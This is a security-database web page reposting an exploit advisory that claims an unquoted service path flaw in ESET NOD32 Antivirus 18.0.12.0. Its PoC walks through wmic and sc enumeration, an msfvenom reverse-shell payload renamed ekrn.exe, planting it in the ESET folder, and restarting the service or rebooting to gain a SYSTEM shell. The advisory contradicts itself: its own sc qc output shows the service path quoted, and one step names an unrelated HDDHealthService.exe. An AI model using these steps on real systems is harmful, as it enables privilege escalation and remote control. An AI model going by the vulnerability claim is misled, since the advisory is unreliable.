---
title: ESET NOD32 Antivirus 18.0.12.0 Unquoted Service Path
url: https://cxsecurity.com/issue/WLB-2024110008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-11-07
fetch_date: 2025-10-06T19:12:25.736955
---

# ESET NOD32 Antivirus 18.0.12.0 Unquoted Service Path

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ESET NOD32 Antivirus 18.0.12.0 Unquoted Service Path** **2024.11.06**  Credit:  **[Milad Karimi](https://cxsecurity.com/author/Milad%2BKarimi/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: ESET NOD32 Antivirus 18.0.12.0 - "ESET Service" Unquoted
Service Path
# Exploit Author: Milad Karimi (Ex3ptionaL)
# Exploit Date: 2024-11-02
# Contact: miladgrayhat@gmail.com
# Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL
# MiRROR-H: https://mirror-h.org/search/hacker/49626/
# Vendor : https://www.eset.com
# Version : 18.0.12.0
# Tested on OS: Microsoft Windows 10 pro x64
About Unquoted Service Path :
==============================
When a service is created whose executable path contains spaces and isn't
enclosed within quotes, leads to a vulnerability known as Unquoted Service
Path which allows a user to gain SYSTEM privileges.
(only if the vulnerable service is running with SYSTEM privilege level
which most of the time it is).
Description:
==============================
ESET NOD32 Antivirus installs a service with an unquoted service path.
To properly exploit this vulnerability, the local attacker must insert an
executable file in the path of the service.
Upon service restart or system reboot, the malicious code will be run with
elevated privileges.
# PoC
===========
1. Open CMD and check for the vulnerability by typing [ wmic service get
name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v
"c:\windows\\" | findstr /i /v """ ]
2. The vulnerable service would show up.
3. Check the service permissions by typing [ sc qc "ekrn" ]
4. The command would return..
C:\Users\Ci3c0>sc qc ekrn
[SC] QueryServiceConfig SUCCESS
SERVICE\_NAME: ekrn
TYPE : 20 WIN32\_SHARE\_PROCESS
START\_TYPE : 2 AUTO\_START
ERROR\_CONTROL : 1 NORMAL
BINARY\_PATH\_NAME : "C:\Program Files\ESET\ESET Security\ekrn.exe"
LOAD\_ORDER\_GROUP : Base
TAG : 0
DISPLAY\_NAME : ESET Service
DEPENDENCIES :
SERVICE\_START\_NAME : LocalSystem
5. This concludes that the service is running as SYSTEM.
6. Now create a payload with msfvenom or other tools and name it to
ekrn.exe.
7. Make sure you have write permissions to "C:\Program Files\ESET\ESET
Security" directory.
8. Provided that you have right permissions, drop the HDDHealthService.exe
executable you created into the "C:\Program Files\ESET\ESET Security"
directory.
9. Start a listener.
9. Now restart the ekrn service by giving coommand [ sc stop ekrn ]
followed by [ sc start ekrn ]
9.1 If you cannot stop and start the service, since the service is of type
"AUTO\_START" we can restart the system by executing [ shutdown /r /t 0 ]
and get the shell when the service starts automatically.
10. Got shell.
During my testing :
Payload : msfvenom -p windows/shell\_reverse\_tcp -f exe -o ekrn.exe
# Disclaimer
=============
The information contained within this advisory is supplied "as-is" with no
warranties or guarantees of fitness of use or otherwise.
The author is not responsible for any misuse of the information contained
herein and accepts no responsibility for any damage caused by the use or
misuse of this information.
The author prohibits any malicious use of security related information or
exploits by the author or elsewhere.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024110008)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 -1

0%

100%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top